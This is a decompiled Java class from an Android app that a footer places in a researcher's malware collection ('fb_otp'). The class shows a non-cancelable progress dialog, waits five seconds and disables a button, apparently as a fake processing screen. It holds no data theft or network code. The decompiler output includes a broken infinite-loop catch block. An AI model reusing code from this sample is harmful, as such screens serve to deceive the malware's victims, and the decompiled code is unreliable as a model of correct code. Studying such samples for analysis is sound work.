import android.app.ProgressDialog;
import android.content.res.Resources;
import android.os.AsyncTask;
import android.widget.Button;
import com.soft360.iService.MainActivity;
import java.util.concurrent.TimeUnit;

public final class dg
  extends AsyncTask
{
  ProgressDialog jdField_a_of_type_AndroidAppProgressDialog;
  
  private dg(MainActivity paramMainActivity) {}
  
  private static Void a()
  {
    try
    {
      TimeUnit.SECONDS.sleep(5L);
      return null;
    }
    catch (InterruptedException localInterruptedException)
    {
      for (;;)
      {
        localInterruptedException.printStackTrace();
      }
    }
  }
  
  protected final void onPreExecute()
  {
    this.jdField_a_of_type_AndroidAppProgressDialog = new ProgressDialog(this.jdField_a_of_type_ComSoft360IServiceMainActivity);
    this.jdField_a_of_type_AndroidAppProgressDialog.setMessage(this.jdField_a_of_type_ComSoft360IServiceMainActivity.a(2131165466));
    this.jdField_a_of_type_AndroidAppProgressDialog.setCancelable(false);
    this.jdField_a_of_type_AndroidAppProgressDialog.show();
    int i = this.jdField_a_of_type_ComSoft360IServiceMainActivity.getResources().getIdentifier("template31_btn_disable", "drawable", this.jdField_a_of_type_ComSoft360IServiceMainActivity.getPackageName());
    ((Button)this.jdField_a_of_type_ComSoft360IServiceMainActivity.findViewById(2131427340)).setBackgroundResource(i);
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/dg.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */